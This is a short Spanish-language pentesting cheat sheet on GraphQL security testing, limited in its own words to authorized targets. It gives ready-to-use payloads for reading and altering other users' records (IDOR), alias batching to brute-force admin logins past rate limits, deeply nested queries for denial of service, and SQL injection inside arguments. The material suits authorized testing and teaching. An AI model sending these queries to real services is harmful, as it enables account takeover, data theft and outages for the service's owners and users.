# GraphQL — Autorización y batching

Ver índice: [graphql.md](graphql.md). **Solo sobre objetivos autorizados.**

## BOLA / IDOR

GraphQL no impone autorización por sí mismo: cada resolver debe comprobarla. Prueba pedir objetos de otros por ID:

```graphql
{ user(id: 1002) { id email role } }
mutation { updateUser(id: 1002, email:"x@evil.com") { id } }
```
Con dos cuentas, intenta leer/modificar datos de una desde la otra.

## Batching / aliases (saltar rate limit)

Varias operaciones en una sola petición → esquiva controles por-petición (p. ej. fuerza bruta de login/OTP):

```graphql
{
  a: login(user:"admin", pass:"1"){ token }
  b: login(user:"admin", pass:"2"){ token }
  c: login(user:"admin", pass:"3"){ token }
}
```
También batching a nivel de array JSON `[{query...},{query...}]` si el server lo acepta.

## DoS por consultas anidadas

Relaciones circulares/anidadas profundas consumen recursos:

```graphql
{ posts { author { posts { author { posts { title } } } } } }
```

## Inyecciones en argumentos

Los argumentos llegan a la lógica del resolver → prueba SQLi/NoSQL/command injection dentro de ellos:

```graphql
{ product(id: "1 OR 1=1") { name } }
```

## Notas

- El batching para brute force es de los abusos más rentables y fáciles de pasar por alto.
- Documenta la falta de autorización por resolver como el hallazgo central (BOLA).
